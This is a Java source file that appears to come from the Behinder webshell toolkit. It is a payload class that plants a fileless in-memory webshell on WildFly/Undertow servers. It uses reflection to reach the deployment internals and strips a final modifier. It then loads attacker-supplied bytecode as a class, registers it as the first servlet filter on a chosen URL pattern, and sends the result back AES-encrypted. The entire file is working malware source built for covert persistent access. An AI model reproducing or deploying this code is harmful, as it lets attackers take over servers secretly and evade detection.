package net.rebeyond.behinder.payload.java.memoryshell;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class Wildfly extends ClassLoader {
    public static String urlPattern;
    public static String shellString;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;


    public boolean equals(Object object) {
        PageContext page = (PageContext)object;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        this.Response.setCharacterEncoding("UTF-8");
        Map<String, String> result = new HashMap<>();

        try {
            Method currentM = Class.forName("io.undertow.servlet.handlers.ServletRequestContext").getDeclaredMethod("current");
            Object curContext = currentM.invoke(null);

            Field servletRequestF = curContext.getClass().getDeclaredField("servletRequest");
            servletRequestF.setAccessible(true);
            Object obj = servletRequestF.get(curContext);

            Field servletContextF = obj.getClass().getDeclaredField("servletContext");
            servletContextF.setAccessible(true);
            Object context = servletContextF.get(obj);
            Field f = context.getClass().getDeclaredField("deploymentInfo");
            f.setAccessible(true);
            Object deploymentInfo = f.get(context);

            String filterName = "filter"+System.currentTimeMillis();

//            Map<String, FilterInfo> filters = deploymentInfo.getFilters();

            Class filterClazz = new Wildfly(this.getClass().getClassLoader()).g(shellString.getBytes(StandardCharsets.ISO_8859_1));

            Constructor<?> constructor = Class.forName("io.undertow.servlet.api.FilterInfo").getConstructor(String.class, Class.class);
            Object filter = constructor.newInstance(filterName, filterClazz);
//            FilterInfo filter = new FilterInfo(filterName, filterClazz);

            Class clazz = Class.forName("io.undertow.servlet.api.FilterInfo");

            Method method = Class.forName("io.undertow.servlet.api.DeploymentInfo").getDeclaredMethod("addFilter", clazz);
            method.invoke(deploymentInfo, filter);

            f = context.getClass().getDeclaredField("deployment");
            f.setAccessible(true);
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
            Object deployment = f.get(context);

            object = Class.forName("io.undertow.servlet.core.DeploymentImpl").getMethod("getFilters").invoke(deployment);

            Class.forName("io.undertow.servlet.core.ManagedFilters").getDeclaredMethod("addFilter", clazz).invoke(object, filter);
//            deployment.getFilters().addFilter(filter);

            // 0 表示把我们动态注册的 filter 放在第一位
            method = Class.forName("io.undertow.servlet.api.DeploymentInfo").getDeclaredMethod("insertFilterUrlMapping", int.class, String.class, String.class, DispatcherType.class);
            method.invoke(deploymentInfo, 0, filterName, urlPattern, DispatcherType.REQUEST);

            result.put("msg", "成功");
            result.put("status", "success");
        } catch (Exception e) {
            result.put("msg", e.getMessage());
            result.put("status", "fail");
        }

        try {

            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e) {
            e.printStackTrace();
        }

        return true;
    }

    public Wildfly() {}
    public Wildfly(ClassLoader c){
        super(c);
    }
    public Class g(byte[] b){
        return super.defineClass(b, 0, b.length);
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {

            sb.append("\"" + key + "\":\"");
            String value = ((String)entity.get(key)).toString();
            if (encode)
            {
                if (version.compareTo("1.9") >= 0) {

                    getClass(); Class<?> Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
                }
                else {

                    getClass(); Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }
}
